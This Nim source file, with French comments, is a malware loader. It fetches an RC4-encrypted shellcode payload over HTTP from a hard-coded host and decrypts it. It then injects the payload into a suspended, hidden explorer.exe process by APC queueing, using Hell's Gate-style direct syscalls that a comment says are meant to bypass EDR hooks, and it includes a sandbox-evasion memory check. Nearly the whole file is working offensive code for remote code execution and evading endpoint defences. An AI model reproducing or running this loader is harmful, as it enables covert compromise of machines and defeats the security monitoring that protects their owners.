import RC4
import httpclient
import winim/lean

var
  client = newHttpClient()
  shellcode = newseq[byte]()
  data : string
  key : string = "kernel32.dll"
  dc : string

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

# ============================================
# HELL'S GATE - Syscall direct
# ============================================

type NTSTATUS = LONG

proc getSyscallNumber(functionName: string): DWORD =
  ## Extrait le syscall number depuis ntdll.dll
  let hNtdll = GetModuleHandle("ntdll.dll")
  if hNtdll == 0:
    return 0
  
  let funcAddress = cast[ptr UncheckedArray[byte]](GetProcAddress(hNtdll, functionName))
  if funcAddress == nil:
    return 0
  
  # Vérifier le pattern: 4C 8B D1 B8 XX 00 00 00
  if funcAddress[0] != 0x4C or funcAddress[1] != 0x8B or funcAddress[2] != 0xD1:
    return 0
  
  if funcAddress[3] != 0xB8:
    return 0
  
  # Extraire le syscall number
  return cast[DWORD](funcAddress[4])

proc createSyscallStub(syscallNumber: DWORD): PVOID =
  ## Crée un stub ASM pour exécuter un syscall
  let stubSize = 12
  let stub = VirtualAlloc(nil, stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  
  if stub == nil:
    return nil
  
  var stubBytes = cast[ptr UncheckedArray[byte]](stub)
  
  # mov r10, rcx
  stubBytes[0] = 0x4C
  stubBytes[1] = 0x8B
  stubBytes[2] = 0xD1
  
  # mov eax, syscallNumber
  stubBytes[3] = 0xB8
  stubBytes[4] = byte(syscallNumber and 0xFF)
  stubBytes[5] = byte((syscallNumber shr 8) and 0xFF)
  stubBytes[6] = 0x00
  stubBytes[7] = 0x00
  
  # syscall
  stubBytes[8] = 0x0F
  stubBytes[9] = 0x05
  
  # ret
  stubBytes[10] = 0xC3
  
  return stub

proc syscallAllocate(
  hProcess: HANDLE,
  baseAddress: ptr PVOID,
  size: SIZE_T,
  allocationType: DWORD,
  protect: DWORD
): NTSTATUS =
  ## NtAllocateVirtualMemory via syscall direct
  
  let syscallNum = getSyscallNumber("NtAllocateVirtualMemory")
  if syscallNum == 0:
    return -1
  
  let stub = createSyscallStub(syscallNum)
  if stub == nil:
    return -1
  
  type NtAllocateVirtualMemoryProc = proc(
    ProcessHandle: HANDLE,
    BaseAddress: ptr PVOID,
    ZeroBits: ULONG,
    RegionSize: ptr SIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
  ): NTSTATUS {.stdcall.}
  
  let ntAllocate = cast[NtAllocateVirtualMemoryProc](stub)
  var regionSize = size
  result = ntAllocate(hProcess, baseAddress, 0, addr regionSize, allocationType, protect)
  
  discard VirtualFree(stub, 0, MEM_RELEASE)

proc syscallWrite(
  hProcess: HANDLE,
  baseAddress: PVOID,
  buffer: PVOID,
  size: SIZE_T
): NTSTATUS =
  ## NtWriteVirtualMemory via syscall direct
  
  let syscallNum = getSyscallNumber("NtWriteVirtualMemory")
  if syscallNum == 0:
    return -1
  
  let stub = createSyscallStub(syscallNum)
  if stub == nil:
    return -1
  
  type NtWriteVirtualMemoryProc = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    NumberOfBytesToWrite: SIZE_T,
    NumberOfBytesWritten: ptr SIZE_T
  ): NTSTATUS {.stdcall.}
  
  let ntWrite = cast[NtWriteVirtualMemoryProc](stub)
  var written: SIZE_T
  result = ntWrite(hProcess, baseAddress, buffer, size, addr written)
  
  discard VirtualFree(stub, 0, MEM_RELEASE)

proc syscallQueueApc(
  hThread: HANDLE,
  apcRoutine: PVOID
): NTSTATUS =
  ## NtQueueApcThread via syscall direct
  
  let syscallNum = getSyscallNumber("NtQueueApcThread")
  if syscallNum == 0:
    return -1
  
  let stub = createSyscallStub(syscallNum)
  if stub == nil:
    return -1
  
  type NtQueueApcThreadProc = proc(
    ThreadHandle: HANDLE,
    ApcRoutine: PVOID,
    ApcArgument1: PVOID,
    ApcArgument2: PVOID,
    ApcArgument3: PVOID
  ): NTSTATUS {.stdcall.}
  
  let ntQueueApc = cast[NtQueueApcThreadProc](stub)
  result = ntQueueApc(hThread, apcRoutine, nil, nil, nil)
  
  discard VirtualFree(stub, 0, MEM_RELEASE)

proc getMemoryInfo(): tuple[total, available: int64] =
  var memoryStatus: MEMORYSTATUSEX
  memoryStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD
  if GlobalMemoryStatusEx(addr memoryStatus) == 0:
    raise newException(OSError, "nop")
  return (total: memoryStatus.ullTotalPhys, available: memoryStatus.ullAvailPhys)

# ============================================
# MAIN avec syscalls directs
# ============================================

proc main(): void =
  let memInfo = getMemoryInfo()
  if memInfo.total < 1024 div (1024 * 1024):
    quit(0)
  
  else:
    # Télécharger et déchiffrer
    data = client.getContent("http://192.168.1.19:8080/api_local")
    client.close()
    dc = fromRC4(key, data)
    shellcode = toByteSeq(dc)
    
    # Créer le processus suspendu
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    si.cb = sizeof(STARTUPINFO).DWORD
    si.dwFlags = STARTF_USESHOWWINDOW
    si.wShowWindow = SW_HIDE
    
    CreateProcess(nil, "explorer.exe", nil, nil, FALSE,
                  DWORD(CREATE_SUSPENDED) or DWORD(CREATE_NO_WINDOW),
                  nil, nil, addr si, addr pi)
    
    # Allouer via SYSCALL direct (bypass hooks EDR)
    var baseAddr: PVOID = nil
    let allocStatus = syscallAllocate(
      pi.hProcess,
      addr baseAddr,
      shellcode.len,
      MEM_COMMIT or MEM_RESERVE,
      PAGE_EXECUTE_READWRITE
    )
    
    if allocStatus != 0 or baseAddr == nil:
      discard TerminateProcess(pi.hProcess, 0)
      quit(1)
    
    # Écrire via SYSCALL direct
    let writeStatus = syscallWrite(
      pi.hProcess,
      baseAddr,
      unsafeAddr shellcode[0],
      shellcode.len
    )
    
    if writeStatus != 0:
      discard TerminateProcess(pi.hProcess, 0)
      quit(1)
    
    # Queue APC via SYSCALL direct
    let apcStatus = syscallQueueApc(pi.hThread, baseAddr)
    
    if apcStatus != 0:
      discard TerminateProcess(pi.hProcess, 0)
      quit(1)
    
    # Reprendre le thread
    ResumeThread(pi.hThread)
    
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

when isMainModule:
  main()
